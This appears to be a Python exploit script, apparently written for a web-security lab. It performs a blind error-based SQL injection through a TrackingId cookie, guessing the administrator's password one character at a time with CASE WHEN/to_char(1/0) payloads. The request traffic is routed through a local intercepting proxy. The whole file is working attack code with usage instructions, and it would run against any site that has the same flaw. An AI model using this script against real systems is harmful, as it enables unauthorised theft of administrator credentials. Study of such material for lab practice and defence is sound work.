import sys
import requests
import urllib3
import urllib.parse

proxies = {
    "http": "http://127.0.0.1:8080",
    "https": "http://127.0.0.1:8080",
    }
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def sqli_password(url,tracking_id,session):
    password = ""
    for i in range(1,21):
        for j in range(32,127):
            sqli_payload = f"' union select case when (ascii(substr(password,{i},1)) = '{j}') then '' else+to_char(1/0) end from users where username = 'administrator' --"
            sqli_payload_encoded = urllib.parse.quote(sqli_payload)

            cookies = {
                "TrackingId":tracking_id+sqli_payload_encoded,
                "session":session
            }
            response = requests.get(url,verify=False,proxies=proxies,cookies=cookies)
            if response.status_code == 200 : # in real life we might want to reverse it and check on the errors , when error occure we are right , kinda less weird i think
                password += chr(j)
                sys.stdout.write('\r'+password)
                sys.stdout.flush()
                break
            else:
                sys.stdout.write('\r'+password+chr(j))
                sys.stdout.flush

def main():
    if len(sys.argv) !=4 :
        print("(-) Usage: %s <url> <trackingId cckie> <session cookie> " % sys.argv[0])
        print("(-) Example: %s https://www.example.com  cookieValue1 cookieValue2 " % sys.argv[0])
        sys.exit(-1)
    url = sys.argv[1]
    tracking_id = sys.argv[2]
    session = sys.argv[3]
    print("(+) Retreving administrator password ...")
    sqli_password(url,tracking_id,session)

if __name__ == "__main__":
    main()